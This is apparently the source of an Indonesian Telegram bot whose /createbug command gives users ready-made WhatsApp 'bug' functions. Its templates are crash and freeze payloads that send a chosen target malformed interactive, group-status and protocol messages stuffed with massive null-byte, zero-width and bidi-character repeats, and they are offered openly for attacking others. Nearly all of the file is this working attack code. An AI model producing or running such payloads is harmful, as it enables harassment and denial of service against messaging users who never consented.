// ✅ ==== TARUH BLOK AUTO‑INSTALL DI SINI — PALING ATAS SEKALI ====
const fs = require('fs');
const { execSync } = require('child_process');
const path = require('path');

const REQUIRED_MODULES = [
  "axios", "form-data", "crypto", "archiver", "chalk", "moment", "pino", "ssh2", "telegraf", "@whiskeysockets/baileys"
];

const pkgPath = path.join(__dirname, "package.json");
const nodeModulesPath = path.join(__dirname, "node_modules");
const lockPath = path.join(__dirname, "package-lock.json");

if (!fs.existsSync(nodeModulesPath) || !fs.existsSync(lockPath)) {
  console.log("📦 Modul belum terpasang → Memulai instalasi otomatis...");
  try {
    execSync("npm install --production", { stdio: "inherit" });
    console.log("✅ Semua paket terinstal — bot siap jalan!");
  } catch (e) {
    console.error("❌ Gagal instal: cek koneksi internet & Node.js");
    process.exit(1);
  }
}
// ✅ ==== SELESAI BAGIAN AUTO‑INSTALL ====

// 🔒 KODE ASLI BOT MULAI DARI SINI — JANGAN DIUBAH
(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    }
    // ... sisa kode proteksi kamu ...

// ... dan seterusnya sampai akhir file


//createbug
bot.command('createbug', async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const jenis = ctx.args[0]?.toLowerCase();

  // Kalau ada argumen & cocok, langsung tampilkan, kalau tidak → tampilkan SEMUA menu
  if (!jenis || !bugTemplates[jenis]) {
    const menuText = "🔧 *CREATE FUNCTION BUG*\n\nPilih jenis bug di bawah ini:\n";
    const buttons = Object.keys(bugTemplates).map(key => ({
      text: bugTemplates[key].name,
      callback_data: `createbug_${key}`
    }));

    const keyboard = [];
    // Susun tombol 2 per baris
    for (let i = 0; i < buttons.length; i += 2) {
      keyboard.push(buttons.slice(i, i + 2));
    }
    keyboard.push([{ text: "❌ Batal", callback_data: "cancel_createbug" }]);

    return ctx.reply(menuText, {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: keyboard }
    });
  }

  // Kalau dipakai: /createbug delay → langsung kirim kode
  const tmpl = bugTemplates[jenis];
  return ctx.reply(`✅ *${tmpl.name}* function siap pakai:\n\n\`\`\`javascript\n${tmpl.code}\n\`\`\``, {
    parse_mode: 'Markdown'
  });
});

//callback createbug
bot.on('callback_query', async (ctx) => {
  const data = ctx.callbackQuery.data;

  if (data.startsWith('createbug_')) {
    const jenis = data.replace('createbug_', '');
    const template = bugTemplates[jenis];

    if (!template) {
      return ctx.answerCbQuery('Jenis bug tidak ditemukan.', true);
    }

    await ctx.reply(`✅ *${template.name}* function siap pakai:

\`\`\`javascript
${template.code}
\`\`\``, { parse_mode: 'Markdown' });

    return ctx.answerCbQuery();
  } 
  else if (data === 'cancel_createbug') {
    await ctx.answerCbQuery('Dibatalkan.');
    return ctx.deleteMessage();
  }
});

//template bug
const bugTemplates = {
  delay: {
    name: 'Delay Hard',
    code: `async function delayBug(sock, target) {
  const Gren = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: { text: "GrenXHarimauDelay", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "cta_url",
            paramsJson: \`{"flow_cta":"\${"\\u0000".repeat(999999) + "\\n"}"}\`,
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "\\u200b/\\n/\\u300b"
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Gren, { participant: { jid: target } });
}`
  },
  fc: {
    name: 'Force Close (No Click)',
    code: `async function fcBug(sock, target) {
  const Gren = {
    interactiveMessage: {
      body: { text: "GrenXHarimauV3" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\\u0000".repeat(20000),
              sections: [{
                title: "\\u200b".repeat(15000),
                rows: [{
                  rowId: "\\u600b".repeat(10000),
                  title: "\\u800b".repeat(12000),
                  description: "\\u0000".repeat(8000)
                }]
              }]
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "\\u0000".repeat(30000),
              url: "https://mmg.whatsapp.net" + "\\u0000".repeat(20000)
            })
          }
        ]
      },
      contextInfo: {
        quotedMessage: {
          interactiveMessage: {
            body: { text: "\\u200b".repeat(10000) },
            nativeFlowMessage: {
              buttons: [{
                name: "single_select",
                buttonParamsJson: JSON.stringify({ title: "\\u0000".repeat(10000) })
              }]
            }
          }
        },
        isForwarded: true,
        forwardingScore: 999
      }
    }
  };
  await sock.relayMessage(target, Gren, {});
}`
  },
  blank: {
    name: 'Blank UI',
    code: `async function blankBug(sock, target) {
  const Gren = {
    interactiveMessage: {
      header: { title: "GrenTzy" },
      body: { text: "kontol" },
      footer: { text: "tak ada yang paling indah" },
      nativeFlowMessage: {
        buttons: [{
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "\\u0000".repeat(50000) + "\\u0600".repeat(50000),
            id: "\\u200b".repeat(60000)
          })
        }]
      }
    }
  };
  await sock.relayMessage(target, Gren, {});
}`
  },
  freeze: {
    name: 'Freeze + Stuck',
    code: `async function freezeBug(sock, target) {
  const Gren = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "Save gue @GrenTzy teman lu" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "GrenTzy Kicau kicau mania",
                  url: "{\\"display_text\\":\\"ⓘ ⸸GrenTzy\\",\\"url\\":\\"http://wa.me/stickerpack/GrenTzy\\",\\"merchant_url\\":\\"https://wa.me/settings/linked_devices/,,GrenTzy\\"}"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: \`{ icon: 'DOKUMENT' }\`.repeat(60900)
              }
            ]
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Gren, {});
}`
  },
  
  'delay-image-no-tag-sw': {
  name: 'Delay Image No‑Tag SW',
  code: `async function delayImageNoTagSW(sock, target) {
  const Gren = {
    imageMessage: { 
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true", 
      directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c", 
      mimetype: 'image/jpeg', 
      caption: 'x', 
      mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=", 
      fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=", 
      fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=", 
      fileLength: '19897899', 
      mediaKeyTimestamp: "1778296099"
    }
  };
  await sock.relayMessage(target, Gren, {});
}`
},

'fc-new': {
  name: 'Force Close New',
  code: `async function fcNew(sock, target) {
  try {
    const crashVectors = [
      {
        message: {
          interactiveMessage: {
            header: {
              title: "wkwk force close",
              subtitle: "wkwk force close",
              hasMediaAttachment: true
            },
            body: {
              text: "\\x00".repeat(65535)
            },
            footer: {
              text: "\\u202E\\u2067\\u202E\\u2067\\u202E\\u2067"
            },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_url",
                buttonParamsJson: "{\"display_text\":\"wkwk force close\",\"url\":\"file:///proc/self/fd/999\",\"merchant_url\":\"javascript:void(0)\"}"
              }],
              messageParamsJson: "{\"a\":"
            }
          }
        }
      },
      {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\\x00".repeat(10000),
                  format: "HYDRATED"
                },
                nativeFlowResponseMessage: {
                  name: "cta_url",
                  paramsJson: "{\"flow_cta\":\"wkwk force close\",\"flow_id\":\"" + "a".repeat(500) + "\",\"flow_data\":\"" + "A".repeat(52428800) + "\",\"flow_action\":\"navigate\",\"flow_action_payload\":\"{\"}",
                  url: "https://crash.invalid/" + "/a".repeat(10000),
                  version: 999
                }
              }
            }
          }
        }
      },
      {
        message: {
          buttonsMessage: {
            contentText: "wkwk force close",
            footerText: "\\u200B\\uFEFF\\u200B\\uFEFF",
            headerType: 69,
            buttons: Array(256).fill({
              buttonId: "wkwk force close" + "a".repeat(1000000),
              buttonText: { displayText: "wkwk force close" },
              type: 69,
              nativeFlowInfo: {
                name: "wkwk force close",
                paramsJson: "{\"a\":"
              }
            })
          }
        }
      },
      {
        message: {
          listMessage: {
            title: "wkwk force close",
            description: "\\u202C\\u202D\\u202E\\u202F",
            buttonText: "\\u200B\\uFEFF",
            listType: 69,
            sections: [{
              title: "wkwk force close",
              rows: Array(999).fill({
                title: "wkwk force close",
                description: "wkwk force close",
                rowId: "wkwk force close" + "a".repeat(1000000)
              })
            }]
          }
        }
      },
      {
        message: {
          protocolMessage: {
            type: 69,
            ephemeralSetting: {
              expiration: 999999999,
              timestamp: BigInt("9999999999999999999"),
              actor: "wkwk force close@s.whatsapp.net",
              groupInfo: {
                groupJid: "wkwkforceclose@g.us",
                groupSubject: "wkwk force close" + "a".repeat(65535),
                parentGroupId: "self"
              }
            }
          }
        }
      }
    ];

    for (const vec of crashVectors) {
      await sock.relayMessage(target, vec.message, {
        participant: { jid: target }
      });
    }
  } catch (e) {
    console.error("fcNew error:", e);
  }
}`
},

combo: {
    name: 'Combo (Delay + FC)',
    code: `async function comboBug(sock, target) {
  // Layer 1: Invisible group status
  const layer1 = {
    groupStatusMessageV2: {
      message: "\\u200B".repeat(90000)
    }
  };
  // Layer 2: Interactive null
  const layer2 = {
    interactiveMessage: {
      body: { text: "\\u0000".repeat(70000) },
      footer: { text: "\\u200B".repeat(70000) },
      nativeFlowMessage: {
        buttons: Array(5).fill({ name: "quick_reply", buttonParamsJson: "\\u0000" })
      }
    }
  };
  await sock.relayMessage(target, layer1, { participant: { jid: target } });
  await sock.relayMessage(target, layer2, { participant: { jid: target } });
}`
  }
};